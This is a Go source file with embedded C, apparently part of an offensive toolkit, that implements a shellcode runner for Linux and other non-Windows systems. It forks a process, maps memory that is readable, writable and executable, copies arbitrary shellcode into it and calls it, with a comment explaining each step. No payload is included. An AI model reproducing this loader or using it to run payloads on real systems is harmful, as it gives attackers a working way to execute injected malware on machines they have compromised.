//go:build !windows && cgo

package shellcode

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

void call(char const *shellcode, size_t const length) {
	// Continue on a new thread or return
	if(fork()) {
		return;
	}

	// https://man7.org/linux/man-pages/man2/mmap.2.html
	// Creates a new mapping in the virtual address space of the
	// calling process. The starting address for the new mapping is
	// specified in addr.
	unsigned char *ptr = (unsigned char *) mmap(0, \
		// Lengh of the shellcode
		length, \
		// Memory Protections
        PROT_READ|PROT_WRITE|PROT_EXEC, \
		// Flags - Not backed by a file | Updates are not visible to other processes
		MAP_ANONYMOUS|MAP_PRIVATE, \
		// Required if MAP_ANONYMOUS (not a file)
		-1, \
		// Required if MAP_ANONYMOUS
		0);
	if(ptr == MAP_FAILED) {
		perror("mmap: can not create a new mapping with the given protections");
		return;
	}

	// https://man7.org/linux/man-pages/man3/memcpy.3.html
	// Copies n bytes from memory area src to memory area dest
	// Efectivelly copying from the beginning of the shellcode as many bytes as its length
	memcpy(ptr, shellcode, length);

	// Cast the pointer (to the shellcode) to a function pointer and calls the function
	( *(void(*) ()) ptr)();
}
*/
import "C"
import (
	"fmt"
	"unsafe"
)

func Execute(shellcode []byte) error {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("ShellCode Execution died")
		}
	}()

	// Calls "call" passing the pointer to the beginning of the shellcode cast as a pointer to a char,
	// and the size of the shellcode cast to an unsigned long int
	C.call((*C.char)(unsafe.Pointer(&shellcode[0])), (C.size_t)(len(shellcode)))
	return nil
}

func LocalExecute(shellcode []byte) error {
	return Execute(shellcode)
}
